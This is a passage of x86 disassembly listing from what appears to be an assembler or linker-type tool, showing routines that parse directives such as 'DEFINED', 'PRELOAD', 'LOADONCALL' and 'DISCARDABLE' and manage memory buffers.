  4047a4:	75 2c                	jne    0x4047d2
  4047a6:	f6 05 c6 ab 40 00 08 	testb  $0x8,0x40abc6
  4047ad:	74 17                	je     0x4047c6
  4047af:	ba 50 08 00 04       	mov    $0x4000850,%edx
  4047b4:	3d ff 7f 00 00       	cmp    $0x7fff,%eax
  4047b9:	77 3b                	ja     0x4047f6
  4047bb:	ba 37 08 00 04       	mov    $0x4000837,%edx
  4047c0:	09 c0                	or     %eax,%eax
  4047c2:	74 32                	je     0x4047f6
  4047c4:	eb 0c                	jmp    0x4047d2
  4047c6:	ba 63 08 00 04       	mov    $0x4000863,%edx
  4047cb:	3d ff ff 00 00       	cmp    $0xffff,%eax
  4047d0:	77 24                	ja     0x4047f6
  4047d2:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  4047d9:	00 00 00 
  4047dc:	80 25 c6 ab 40 00 f5 	andb   $0xf5,0x40abc6
  4047e3:	80 25 c5 ab 40 00 fe 	andb   $0xfe,0x40abc5
  4047ea:	c3                   	ret
  4047eb:	31 c0                	xor    %eax,%eax
  4047ed:	f6 05 c5 ab 40 00 01 	testb  $0x1,0x40abc5
  4047f4:	75 dc                	jne    0x4047d2
  4047f6:	80 25 c6 ab 40 00 f5 	andb   $0xf5,0x40abc6
  4047fd:	80 25 c5 ab 40 00 fe 	andb   $0xfe,0x40abc5
  404804:	f9                   	stc
  404805:	c3                   	ret
  404806:	89 d8                	mov    %ebx,%eax
  404808:	c1 e0 08             	shl    $0x8,%eax
  40480b:	89 da                	mov    %ebx,%edx
  40480d:	4a                   	dec    %edx
  40480e:	78 16                	js     0x404826
  404810:	8a 04 16             	mov    (%esi,%edx,1),%al
  404813:	c1 e0 08             	shl    $0x8,%eax
  404816:	4a                   	dec    %edx
  404817:	78 12                	js     0x40482b
  404819:	8a 04 16             	mov    (%esi,%edx,1),%al
  40481c:	c1 e0 08             	shl    $0x8,%eax
  40481f:	4a                   	dec    %edx
  404820:	78 0e                	js     0x404830
  404822:	8a 04 16             	mov    (%esi,%edx,1),%al
  404825:	c3                   	ret
  404826:	b0 20                	mov    $0x20,%al
  404828:	c1 e0 08             	shl    $0x8,%eax
  40482b:	b0 20                	mov    $0x20,%al
  40482d:	c1 e0 08             	shl    $0x8,%eax
  404830:	b0 20                	mov    $0x20,%al
  404832:	c3                   	ret
  404833:	50                   	push   %eax
  404834:	57                   	push   %edi
  404835:	8b 7a 08             	mov    0x8(%edx),%edi
  404838:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40483b:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40483e:	8a 06                	mov    (%esi),%al
  404840:	38 07                	cmp    %al,(%edi)
  404842:	75 05                	jne    0x404849
  404844:	46                   	inc    %esi
  404845:	47                   	inc    %edi
  404846:	4b                   	dec    %ebx
  404847:	75 f5                	jne    0x40483e
  404849:	5f                   	pop    %edi
  40484a:	58                   	pop    %eax
  40484b:	c3                   	ret
  40484c:	51                   	push   %ecx
  40484d:	8b 0d 64 aa 40 00    	mov    0x40aa64,%ecx
  404853:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  404858:	76 28                	jbe    0x404882
  40485a:	eb 21                	jmp    0x40487d
  40485c:	51                   	push   %ecx
  40485d:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  404862:	76 1e                	jbe    0x404882
  404864:	89 d1                	mov    %edx,%ecx
  404866:	8b 15 68 aa 40 00    	mov    0x40aa68,%edx
  40486c:	eb 0f                	jmp    0x40487d
  40486e:	39 ca                	cmp    %ecx,%edx
  404870:	72 10                	jb     0x404882
  404872:	39 02                	cmp    %eax,(%edx)
  404874:	75 07                	jne    0x40487d
  404876:	e8 b8 ff ff ff       	call   0x404833
  40487b:	74 08                	je     0x404885
  40487d:	83 ea 20             	sub    $0x20,%edx
  404880:	eb ec                	jmp    0x40486e
  404882:	f9                   	stc
  404883:	eb 07                	jmp    0x40488c
  404885:	83 7a 0c 06          	cmpl   $0x6,0xc(%edx)
  404889:	74 f7                	je     0x404882
  40488b:	f8                   	clc
  40488c:	59                   	pop    %ecx
  40488d:	c3                   	ret
  40488e:	55                   	push   %ebp
  40488f:	89 e5                	mov    %esp,%ebp
  404891:	83 ec 20             	sub    $0x20,%esp
  404894:	89 75 fc             	mov    %esi,-0x4(%ebp)
  404897:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40489a:	e8 67 ff ff ff       	call   0x404806
  40489f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4048a2:	8b 15 64 aa 40 00    	mov    0x40aa64,%edx
  4048a8:	e8 af ff ff ff       	call   0x40485c
  4048ad:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4048b0:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4048b3:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4048b6:	89 ec                	mov    %ebp,%esp
  4048b8:	5d                   	pop    %ebp
  4048b9:	c3                   	ret
  4048ba:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  4048c1:	e8 43 fb ff ff       	call   0x404409
  4048c6:	72 1d                	jb     0x4048e5
  4048c8:	74 1b                	je     0x4048e5
  4048ca:	e8 34 fa ff ff       	call   0x404303
  4048cf:	72 0f                	jb     0x4048e0
  4048d1:	75 0d                	jne    0x4048e0
  4048d3:	e8 b6 ff ff ff       	call   0x40488e
  4048d8:	9f                   	lahf
  4048d9:	25 00 01 00 00       	and    $0x100,%eax
  4048de:	eb 06                	jmp    0x4048e6
  4048e0:	ba 2e 08 00 04       	mov    $0x400082e,%edx
  4048e5:	f9                   	stc
  4048e6:	c3                   	ret
  4048e7:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  4048ee:	e8 16 fb ff ff       	call   0x404409
  4048f3:	72 24                	jb     0x404919
  4048f5:	74 22                	je     0x404919
  4048f7:	e8 07 fa ff ff       	call   0x404303
  4048fc:	72 16                	jb     0x404914
  4048fe:	75 14                	jne    0x404914
  404900:	e8 89 ff ff ff       	call   0x40488e
  404905:	72 07                	jb     0x40490e
  404907:	c7 42 0c 06 00 00 00 	movl   $0x6,0xc(%edx)
  40490e:	ba 3d 08 00 00       	mov    $0x83d,%edx
  404913:	c3                   	ret
  404914:	ba 2f 08 00 04       	mov    $0x400082f,%edx
  404919:	f9                   	stc
  40491a:	c3                   	ret
  40491b:	39 05 b8 aa 40 00    	cmp    %eax,0x40aab8
  404921:	8a 1d c1 ab 40 00    	mov    0x40abc1,%bl
  404927:	b7 01                	mov    $0x1,%bh
  404929:	72 06                	jb     0x404931
  40492b:	b7 02                	mov    $0x2,%bh
  40492d:	77 02                	ja     0x404931
  40492f:	b7 04                	mov    $0x4,%bh
  404931:	31 c0                	xor    %eax,%eax
  404933:	84 df                	test   %bl,%bh
  404935:	74 01                	je     0x404938
  404937:	40                   	inc    %eax
  404938:	c3                   	ret
  404939:	e8 ca f1 ff ff       	call   0x403b08
  40493e:	73 04                	jae    0x404944
  404940:	31 c0                	xor    %eax,%eax
  404942:	eb 50                	jmp    0x404994
  404944:	e8 45 f2 ff ff       	call   0x403b8e
  404949:	72 11                	jb     0x40495c
  40494b:	75 53                	jne    0x4049a0
  40494d:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  404954:	00 00 00 
  404957:	a3 b8 aa 40 00       	mov    %eax,0x40aab8
  40495c:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  404963:	e8 a1 fa ff ff       	call   0x404409
  404968:	72 36                	jb     0x4049a0
  40496a:	e8 52 f8 ff ff       	call   0x4041c1
  40496f:	b8 01 00 00 00       	mov    $0x1,%eax
  404974:	72 1e                	jb     0x404994
  404976:	88 1d c1 ab 40 00    	mov    %bl,0x40abc1
  40497c:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  404983:	ba 3c 08 00 00       	mov    $0x83c,%edx
  404988:	e8 6a fc ff ff       	call   0x4045f7
  40498d:	72 10                	jb     0x40499f
  40498f:	e8 87 ff ff ff       	call   0x40491b
  404994:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  40499b:	00 00 00 
  40499e:	f8                   	clc
  40499f:	c3                   	ret
  4049a0:	8b 15 d0 aa 40 00    	mov    0x40aad0,%edx
  4049a6:	f9                   	stc
  4049a7:	c3                   	ret
  4049a8:	80 25 c8 ab 40 00 df 	andb   $0xdf,0x40abc8
  4049af:	e8 1a e4 ff ff       	call   0x402dce
  4049b4:	74 1e                	je     0x4049d4
  4049b6:	80 3f 21             	cmpb   $0x21,(%edi)
  4049b9:	75 17                	jne    0x4049d2
  4049bb:	80 0d c8 ab 40 00 20 	orb    $0x20,0x40abc8
  4049c2:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  4049c9:	47                   	inc    %edi
  4049ca:	49                   	dec    %ecx
  4049cb:	e8 fe e3 ff ff       	call   0x402dce
  4049d0:	74 02                	je     0x4049d4
  4049d2:	f8                   	clc
  4049d3:	c3                   	ret
  4049d4:	f9                   	stc
  4049d5:	c3                   	ret
  4049d6:	83 f9 07             	cmp    $0x7,%ecx
  4049d9:	72 20                	jb     0x4049fb
  4049db:	81 3f 64 65 66 69    	cmpl   $0x69666564,(%edi)
  4049e1:	75 09                	jne    0x4049ec
  4049e3:	81 7f 03 69 6e 65 64 	cmpl   $0x64656e69,0x3(%edi)
  4049ea:	74 0f                	je     0x4049fb
  4049ec:	81 3f 44 45 46 49    	cmpl   $0x49464544,(%edi)
  4049f2:	75 07                	jne    0x4049fb
  4049f4:	81 7f 03 49 4e 45 44 	cmpl   $0x44454e49,0x3(%edi)
  4049fb:	75 0a                	jne    0x404a07
  4049fd:	83 c7 07             	add    $0x7,%edi
  404a00:	83 e9 07             	sub    $0x7,%ecx
  404a03:	74 04                	je     0x404a09
  404a05:	31 d2                	xor    %edx,%edx
  404a07:	f8                   	clc
  404a08:	c3                   	ret
  404a09:	e8 36 e3 ff ff       	call   0x402d44
  404a0e:	75 c6                	jne    0x4049d6
  404a10:	ba 60 18 00 00       	mov    $0x1860,%edx
  404a15:	f9                   	stc
  404a16:	c3                   	ret
  404a17:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  404a1e:	e8 e6 f9 ff ff       	call   0x404409
  404a23:	72 1f                	jb     0x404a44
  404a25:	74 1d                	je     0x404a44
  404a27:	e8 d7 f8 ff ff       	call   0x404303
  404a2c:	72 16                	jb     0x404a44
  404a2e:	74 0d                	je     0x404a3d
  404a30:	e8 97 f1 ff ff       	call   0x403bcc
  404a35:	8b 15 d0 aa 40 00    	mov    0x40aad0,%edx
  404a3b:	eb 08                	jmp    0x404a45
  404a3d:	e8 f7 fe ff ff       	call   0x404939
  404a42:	eb 01                	jmp    0x404a45
  404a44:	f9                   	stc
  404a45:	c3                   	ret
  404a46:	e8 83 e3 ff ff       	call   0x402dce
  404a4b:	74 5a                	je     0x404aa7
  404a4d:	e8 b1 f8 ff ff       	call   0x404303
  404a52:	72 52                	jb     0x404aa6
  404a54:	75 6d                	jne    0x404ac3
  404a56:	e8 64 e2 ff ff       	call   0x402cbf
  404a5b:	75 66                	jne    0x404ac3
  404a5d:	be ec ab 40 00       	mov    $0x40abec,%esi
  404a62:	b8 7c d6 40 00       	mov    $0x40d67c,%eax
  404a67:	e8 12 37 00 00       	call   0x40817e
  404a6c:	72 55                	jb     0x404ac3
  404a6e:	3c 80                	cmp    $0x80,%al
  404a70:	72 64                	jb     0x404ad6
  404a72:	3c ff                	cmp    $0xff,%al
  404a74:	74 14                	je     0x404a8a
  404a76:	e8 b4 f7 ff ff       	call   0x40422f
  404a7b:	72 2a                	jb     0x404aa7
  404a7d:	2c 80                	sub    $0x80,%al
  404a7f:	75 28                	jne    0x404aa9
  404a81:	e8 ca e7 ff ff       	call   0x403250
  404a86:	72 1e                	jb     0x404aa6
  404a88:	74 06                	je     0x404a90
  404a8a:	e8 55 e2 ff ff       	call   0x402ce4
  404a8f:	c3                   	ret
  404a90:	8b 4e 30             	mov    0x30(%esi),%ecx
  404a93:	8b 7e 18             	mov    0x18(%esi),%edi
  404a96:	c7 05 0c ab 40 00 01 	movl   $0x1,0x40ab0c
  404a9d:	00 00 00 
  404aa0:	ff 05 00 ab 40 00    	incl   0x40ab00
  404aa6:	c3                   	ret
  404aa7:	f8                   	clc
  404aa8:	c3                   	ret
  404aa9:	fe c8                	dec    %al
  404aab:	75 0b                	jne    0x404ab8
  404aad:	e8 35 fe ff ff       	call   0x4048e7
  404ab2:	e8 2d e2 ff ff       	call   0x402ce4
  404ab7:	c3                   	ret
  404ab8:	e8 8f 39 00 00       	call   0x40844c
  404abd:	e8 22 e2 ff ff       	call   0x402ce4
  404ac2:	c3                   	ret
  404ac3:	ff 0d 14 ab 40 00    	decl   0x40ab14
  404ac9:	ff 05 18 ab 40 00    	incl   0x40ab18
  404acf:	ba 3b 08 00 00       	mov    $0x83b,%edx
  404ad4:	eb 3c                	jmp    0x404b12
  404ad6:	fe c8                	dec    %al
  404ad8:	75 3a                	jne    0x404b14
  404ada:	e8 86 f7 ff ff       	call   0x404265
  404adf:	72 31                	jb     0x404b12
  404ae1:	0f 84 80 00 00 00    	je     0x404b67
  404ae7:	e8 bc fe ff ff       	call   0x4049a8
  404aec:	72 24                	jb     0x404b12
  404aee:	e8 e3 fe ff ff       	call   0x4049d6
  404af3:	72 1d                	jb     0x404b12
  404af5:	0f 84 82 00 00 00    	je     0x404b7d
  404afb:	c7 05 d0 aa 40 00 27 	movl   $0x4000827,0x40aad0
  404b02:	08 00 04 
  404b05:	e8 0d ff ff ff       	call   0x404a17
  404b0a:	72 06                	jb     0x404b12
  404b0c:	e8 b3 f7 ff ff       	call   0x4042c4
  404b11:	c3                   	ret
  404b12:	f9                   	stc
  404b13:	c3                   	ret
  404b14:	fe c8                	dec    %al
  404b16:	75 30                	jne    0x404b48
  404b18:	e8 28 f7 ff ff       	call   0x404245
  404b1d:	72 f3                	jb     0x404b12
  404b1f:	74 46                	je     0x404b67
  404b21:	e8 82 fe ff ff       	call   0x4049a8
  404b26:	72 ea                	jb     0x404b12
  404b28:	e8 a9 fe ff ff       	call   0x4049d6
  404b2d:	72 e3                	jb     0x404b12
  404b2f:	74 4c                	je     0x404b7d
  404b31:	c7 05 d0 aa 40 00 2d 	movl   $0x400082d,0x40aad0
  404b38:	08 00 04 
  404b3b:	e8 d7 fe ff ff       	call   0x404a17
  404b40:	72 d0                	jb     0x404b12
  404b42:	e8 7d f7 ff ff       	call   0x4042c4
  404b47:	c3                   	ret
  404b48:	fe c8                	dec    %al
  404b4a:	75 1d                	jne    0x404b69
  404b4c:	e8 f4 f6 ff ff       	call   0x404245
  404b51:	72 bf                	jb     0x404b12
  404b53:	74 12                	je     0x404b67
  404b55:	80 25 c8 ab 40 00 df 	andb   $0xdf,0x40abc8
  404b5c:	b8 01 00 00 00       	mov    $0x1,%eax
  404b61:	e8 5e f7 ff ff       	call   0x4042c4
  404b66:	c3                   	ret
  404b67:	f8                   	clc
  404b68:	c3                   	ret
  404b69:	fe c8                	dec    %al
  404b6b:	75 22                	jne    0x404b8f
  404b6d:	e8 f3 f6 ff ff       	call   0x404265
  404b72:	72 1a                	jb     0x404b8e
  404b74:	74 18                	je     0x404b8e
  404b76:	e8 2d fe ff ff       	call   0x4049a8
  404b7b:	72 11                	jb     0x404b8e
  404b7d:	e8 38 fd ff ff       	call   0x4048ba
  404b82:	72 0a                	jb     0x404b8e
  404b84:	35 00 01 00 00       	xor    $0x100,%eax
  404b89:	e8 36 f7 ff ff       	call   0x4042c4
  404b8e:	c3                   	ret
  404b8f:	fe c8                	dec    %al
  404b91:	75 1d                	jne    0x404bb0
  404b93:	e8 cd f6 ff ff       	call   0x404265
  404b98:	72 f4                	jb     0x404b8e
  404b9a:	74 f2                	je     0x404b8e
  404b9c:	e8 07 fe ff ff       	call   0x4049a8
  404ba1:	72 eb                	jb     0x404b8e
  404ba3:	e8 12 fd ff ff       	call   0x4048ba
  404ba8:	72 e4                	jb     0x404b8e
  404baa:	e8 15 f7 ff ff       	call   0x4042c4
  404baf:	c3                   	ret
  404bb0:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  404bb7:	74 0e                	je     0x404bc7
  404bb9:	8b 15 88 aa 40 00    	mov    0x40aa88,%edx
  404bbf:	66 ff 4a 34          	decw   0x34(%edx)
  404bc3:	79 a2                	jns    0x404b67
  404bc5:	eb 08                	jmp    0x404bcf
  404bc7:	ff 0d f4 aa 40 00    	decl   0x40aaf4
  404bcd:	79 98                	jns    0x404b67
  404bcf:	ba 26 18 00 04       	mov    $0x4001826,%edx
  404bd4:	f9                   	stc
  404bd5:	c3                   	ret
  404bd6:	80 fb 07             	cmp    $0x7,%bl
  404bd9:	75 13                	jne    0x404bee
  404bdb:	81 3e 50 52 45 4c    	cmpl   $0x4c455250,(%esi)
  404be1:	75 2a                	jne    0x404c0d
  404be3:	81 7e 03 4c 4f 41 44 	cmpl   $0x44414f4c,0x3(%esi)
  404bea:	75 21                	jne    0x404c0d
  404bec:	f8                   	clc
  404bed:	c3                   	ret
  404bee:	80 fb 0a             	cmp    $0xa,%bl
  404bf1:	75 1a                	jne    0x404c0d
  404bf3:	81 3e 4c 4f 41 44    	cmpl   $0x44414f4c,(%esi)
  404bf9:	75 12                	jne    0x404c0d
  404bfb:	81 7e 04 4f 4e 43 41 	cmpl   $0x41434e4f,0x4(%esi)
  404c02:	75 09                	jne    0x404c0d
  404c04:	81 7e 06 43 41 4c 4c 	cmpl   $0x4c4c4143,0x6(%esi)
  404c0b:	74 df                	je     0x404bec
  404c0d:	80 fb 04             	cmp    $0x4,%bl
  404c10:	75 0a                	jne    0x404c1c
  404c12:	81 3e 50 55 52 45    	cmpl   $0x45525550,(%esi)
  404c18:	74 d2                	je     0x404bec
  404c1a:	eb 72                	jmp    0x404c8e
  404c1c:	80 fb 05             	cmp    $0x5,%bl
  404c1f:	75 10                	jne    0x404c31
  404c21:	81 3e 46 49 58 45    	cmpl   $0x45584946,(%esi)
  404c27:	75 65                	jne    0x404c8e
  404c29:	80 7e 04 44          	cmpb   $0x44,0x4(%esi)
  404c2d:	74 bd                	je     0x404bec
  404c2f:	eb 5d                	jmp    0x404c8e
  404c31:	80 fb 06             	cmp    $0x6,%bl
  404c34:	75 13                	jne    0x404c49
  404c36:	81 3e 49 4d 50 55    	cmpl   $0x55504d49,(%esi)
  404c3c:	75 50                	jne    0x404c8e
  404c3e:	81 7e 02 50 55 52 45 	cmpl   $0x45525550,0x2(%esi)
  404c45:	75 47                	jne    0x404c8e
  404c47:	eb a3                	jmp    0x404bec
  404c49:	80 fb 08             	cmp    $0x8,%bl
  404c4c:	75 13                	jne    0x404c61
  404c4e:	81 3e 4d 4f 56 45    	cmpl   $0x45564f4d,(%esi)
  404c54:	75 38                	jne    0x404c8e
  404c56:	81 7e 04 41 42 4c 45 	cmpl   $0x454c4241,0x4(%esi)
  404c5d:	75 2f                	jne    0x404c8e
  404c5f:	eb 8b                	jmp    0x404bec
  404c61:	80 fb 0b             	cmp    $0xb,%bl
  404c64:	75 28                	jne    0x404c8e
  404c66:	81 3e 44 49 53 43    	cmpl   $0x43534944,(%esi)
  404c6c:	75 20                	jne    0x404c8e
  404c6e:	81 7e 04 41 52 44 41 	cmpl   $0x41445241,0x4(%esi)
  404c75:	75 17                	jne    0x404c8e
  404c77:	81 7e 07 41 42 4c 45 	cmpl   $0x454c4241,0x7(%esi)
  404c7e:	75 0e                	jne    0x404c8e
  404c80:	66 c7 05 74 ab 40 00 	movw   $0x1000,0x40ab74
  404c87:	00 10 
  404c89:	e9 5e ff ff ff       	jmp    0x404bec
  404c8e:	f9                   	stc
  404c8f:	c3                   	ret
  404c90:	89 3d 10 ab 40 00    	mov    %edi,0x40ab10
  404c96:	c7 05 b4 aa 40 00 00 	movl   $0x0,0x40aab4
  404c9d:	00 00 00 
  404ca0:	80 25 c5 ab 40 00 f7 	andb   $0xf7,0x40abc5
  404ca7:	f6 05 c8 ab 40 00 04 	testb  $0x4,0x40abc8
  404cae:	74 1f                	je     0x404ccf
  404cb0:	89 35 10 ab 40 00    	mov    %esi,0x40ab10
  404cb6:	c6 05 c0 ab 40 00 00 	movb   $0x0,0x40abc0
  404cbd:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  404cc4:	eb 3d                	jmp    0x404d03
  404cc6:	e8 3e f7 ff ff       	call   0x404409
  404ccb:	72 5f                	jb     0x404d2c
  404ccd:	74 71                	je     0x404d40
  404ccf:	c6 05 c0 ab 40 00 00 	movb   $0x0,0x40abc0
  404cd6:	8a 15 c5 ab 40 00    	mov    0x40abc5,%dl
  404cdc:	e8 9d f4 ff ff       	call   0x40417e
  404ce1:	72 4e                	jb     0x404d31
  404ce3:	a2 c0 ab 40 00       	mov    %al,0x40abc0
  404ce8:	e8 1c f7 ff ff       	call   0x404409
  404ced:	72 3d                	jb     0x404d2c
  404cef:	74 4f                	je     0x404d40
  404cf1:	e8 0d f6 ff ff       	call   0x404303
  404cf6:	9c                   	pushf
  404cf7:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  404cfe:	9d                   	popf
  404cff:	72 30                	jb     0x404d31
  404d01:	74 2e                	je     0x404d31
  404d03:	e8 c4 ee ff ff       	call   0x403bcc
  404d08:	72 27                	jb     0x404d31
  404d0a:	e8 90 ef ff ff       	call   0x403c9f
  404d0f:	72 2f                	jb     0x404d40
  404d11:	8b 15 b4 aa 40 00    	mov    0x40aab4,%edx
  404d17:	e8 bc f3 ff ff       	call   0x4040d8
  404d1c:	72 22                	jb     0x404d40
  404d1e:	a3 b4 aa 40 00       	mov    %eax,0x40aab4
  404d23:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  404d2a:	eb 9a                	jmp    0x404cc6
  404d2c:	83 f9 00             	cmp    $0x0,%ecx
  404d2f:	75 0f                	jne    0x404d40
  404d31:	f6 05 c5 ab 40 00 08 	testb  $0x8,0x40abc5
  404d38:	75 0f                	jne    0x404d49
  404d3a:	8b 15 cc aa 40 00    	mov    0x40aacc,%edx
  404d40:	80 25 c5 ab 40 00 f7 	andb   $0xf7,0x40abc5
  404d47:	f9                   	stc
  404d48:	c3                   	ret
  404d49:	a1 b4 aa 40 00       	mov    0x40aab4,%eax
  404d4e:	80 25 c5 ab 40 00 f7 	andb   $0xf7,0x40abc5
  404d55:	c3                   	ret
  404d56:	89 15 d4 aa 40 00    	mov    %edx,0x40aad4
  404d5c:	c7 05 cc aa 40 00 80 	movl   $0x880,0x40aacc
  404d63:	08 00 00 
  404d66:	31 c0                	xor    %eax,%eax
  404d68:	50                   	push   %eax
  404d69:	eb 08                	jmp    0x404d73
  404d6b:	50                   	push   %eax
  404d6c:	e8 f0 f7 ff ff       	call   0x404561
  404d71:	72 07                	jb     0x404d7a
  404d73:	e8 18 ff ff ff       	call   0x404c90
  404d78:	89 c3                	mov    %eax,%ebx
  404d7a:	58                   	pop    %eax
  404d7b:	72 1f                	jb     0x404d9c
  404d7d:	8b 15 d4 aa 40 00    	mov    0x40aad4,%edx
  404d83:	66 89 1c 42          	mov    %bx,(%edx,%eax,2)
  404d87:	40                   	inc    %eax
  404d88:	83 f8 02             	cmp    $0x2,%eax
  404d8b:	74 0a                	je     0x404d97
  404d8d:	c7 05 cc aa 40 00 81 	movl   $0x881,0x40aacc
  404d94:	08 00 00 
  404d97:	83 f8 04             	cmp    $0x4,%eax
  404d9a:	75 cf                	jne    0x404d6b
  404d9c:	c3                   	ret
  404d9d:	f6 05 c8 ab 40 00 04 	testb  $0x4,0x40abc8
  404da4:	74 07                	je     0x404dad
  404da6:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  404dad:	8a 27                	mov    (%edi),%ah
  404daf:	47                   	inc    %edi
  404db0:	49                   	dec    %ecx
  404db1:	74 17                	je     0x404dca
  404db3:	89 fe                	mov    %edi,%esi
  404db5:	80 fc 3c             	cmp    $0x3c,%ah
  404db8:	75 02                	jne    0x404dbc
  404dba:	b4 3e                	mov    $0x3e,%ah
  404dbc:	8a 07                	mov    (%edi),%al
  404dbe:	3c 0d                	cmp    $0xd,%al
  404dc0:	74 08                	je     0x404dca
  404dc2:	47                   	inc    %edi
  404dc3:	38 e0                	cmp    %ah,%al
  404dc5:	74 05                	je     0x404dcc
  404dc7:	49                   	dec    %ecx
  404dc8:	75 f2                	jne    0x404dbc
  404dca:	f9                   	stc
  404dcb:	c3                   	ret
  404dcc:	49                   	dec    %ecx
  404dcd:	89 fb                	mov    %edi,%ebx
  404dcf:	29 f3                	sub    %esi,%ebx
  404dd1:	4b                   	dec    %ebx
  404dd2:	89 1d 18 ab 40 00    	mov    %ebx,0x40ab18
  404dd8:	89 35 14 ab 40 00    	mov    %esi,0x40ab14
  404dde:	f8                   	clc
  404ddf:	c3                   	ret
  404de0:	50                   	push   %eax
  404de1:	51                   	push   %ecx
  404de2:	53                   	push   %ebx
  404de3:	89 d3                	mov    %edx,%ebx
  404de5:	a1 78 aa 40 00       	mov    0x40aa78,%eax
  404dea:	01 d8                	add    %ebx,%eax
  404dec:	3b 05 74 aa 40 00    	cmp    0x40aa74,%eax
  404df2:	72 27                	jb     0x404e1b
  404df4:	6a 04                	push   $0x4
  404df6:	68 00 10 00 00       	push   $0x1000
  404dfb:	68 00 10 00 00       	push   $0x1000
  404e00:	ff 35 74 aa 40 00    	push   0x40aa74
  404e06:	e8 43 d2 00 00       	call   0x41204e
  404e0b:	09 c0                	or     %eax,%eax
  404e0d:	74 0f                	je     0x404e1e
  404e0f:	81 05 74 aa 40 00 00 	addl   $0x1000,0x40aa74
  404e16:	10 00 00 
  404e19:	eb ca                	jmp    0x404de5
  404e1b:	f8                   	clc
  404e1c:	eb 06                	jmp    0x404e24
  404e1e:	ba 8a 18 01 00       	mov    $0x1188a,%edx
  404e23:	f9                   	stc
  404e24:	5b                   	pop    %ebx
  404e25:	59                   	pop    %ecx
  404e26:	58                   	pop    %eax
  404e27:	c3                   	ret
  404e28:	f7 c6 03 00 00 00    	test   $0x3,%esi
  404e2e:	74 09                	je     0x404e39
  404e30:	c1 ee 02             	shr    $0x2,%esi
  404e33:	c1 e6 02             	shl    $0x2,%esi
  404e36:	83 c6 04             	add    $0x4,%esi
  404e39:	c3                   	ret
  404e3a:	51                   	push   %ecx
  404e3b:	57                   	push   %edi
  404e3c:	e8 9f ff ff ff       	call   0x404de0
  404e41:	72 1d                	jb     0x404e60
  404e43:	8b 3d 78 aa 40 00    	mov    0x40aa78,%edi
  404e49:	e8 b1 1a 00 00       	call   0x4068ff
  404e4e:	e8 c6 dd ff ff       	call   0x402c19
  404e53:	89 3d 78 aa 40 00    	mov    %edi,0x40aa78
  404e59:	89 3d d8 aa 40 00    	mov    %edi,0x40aad8
  404e5f:	f8                   	clc
  404e60:	5f                   	pop    %edi
  404e61:	59                   	pop    %ecx
  404e62:	c3                   	ret
  404e63:	c7 05 c0 aa 40 00 00 	movl   $0x0,0x40aac0
  404e6a:	00 00 00 
  404e6d:	ba 00 04 00 00       	mov    $0x400,%edx
  404e72:	e8 69 ff ff ff       	call   0x404de0
  404e77:	72 28                	jb     0x404ea1
  404e79:	8b 35 78 aa 40 00    	mov    0x40aa78,%esi
  404e7f:	f6 05 c7 ab 40 00 08 	testb  $0x8,0x40abc7
  404e86:	75 0b                	jne    0x404e93
  404e88:	e8 9b ff ff ff       	call   0x404e28
  404e8d:	89 35 78 aa 40 00    	mov    %esi,0x40aa78
  404e93:	89 35 dc aa 40 00    	mov    %esi,0x40aadc
  404e99:	80 25 c7 ab 40 00 f7 	andb   $0xf7,0x40abc7
  404ea0:	c3                   	ret
  404ea1:	80 25 c7 ab 40 00 f7 	andb   $0xf7,0x40abc7
  404ea8:	f9                   	stc
  404ea9:	c3                   	ret
  404eaa:	e8 5a f5 ff ff       	call   0x404409
  404eaf:	72 55                	jb     0x404f06
  404eb1:	e8 4d f4 ff ff       	call   0x404303
  404eb6:	72 49                	jb     0x404f01
  404eb8:	74 1a                	je     0x404ed4
  404eba:	e8 0d ed ff ff       	call   0x403bcc
  404ebf:	72 40                	jb     0x404f01
  404ec1:	e8 d9 ed ff ff       	call   0x403c9f
  404ec6:	3d ff 03 00 00       	cmp    $0x3ff,%eax
  404ecb:	76 3b                	jbe    0x404f08
  404ecd:	ba 87 08 00 00       	mov    $0x887,%edx
  404ed2:	eb 32                	jmp    0x404f06
  404ed4:	53                   	push   %ebx
  404ed5:	56                   	push   %esi
  404ed6:	b8 58 c4 40 00       	mov    $0x40c458,%eax
  404edb:	e8 02 33 00 00       	call   0x4081e2
  404ee0:	5e                   	pop    %esi
  404ee1:	5b                   	pop    %ebx
  404ee2:	73 24                	jae    0x404f08
  404ee4:	e8 1f ec ff ff       	call   0x403b08
  404ee9:	72 0b                	jb     0x404ef6
  404eeb:	e8 9e ec ff ff       	call   0x403b8e
  404ef0:	72 b8                	jb     0x404eaa
  404ef2:	74 cd                	je     0x404ec1
  404ef4:	eb 04                	jmp    0x404efa
  404ef6:	09 d2                	or     %edx,%edx
  404ef8:	75 0c                	jne    0x404f06
  404efa:	ba 54 28 00 00       	mov    $0x2854,%edx
  404eff:	eb 7b                	jmp    0x404f7c
  404f01:	ba 56 08 00 00       	mov    $0x856,%edx
  404f06:	f9                   	stc
  404f07:	c3                   	ret
  404f08:	a3 50 aa 40 00       	mov    %eax,0x40aa50
  404f0d:	e8 4f f6 ff ff       	call   0x404561
  404f12:	72 6a                	jb     0x404f7e
  404f14:	e8 f0 f4 ff ff       	call   0x404409
  404f19:	72 63                	jb     0x404f7e
  404f1b:	e8 e3 f3 ff ff       	call   0x404303
  404f20:	72 55                	jb     0x404f77
  404f22:	74 18                	je     0x404f3c
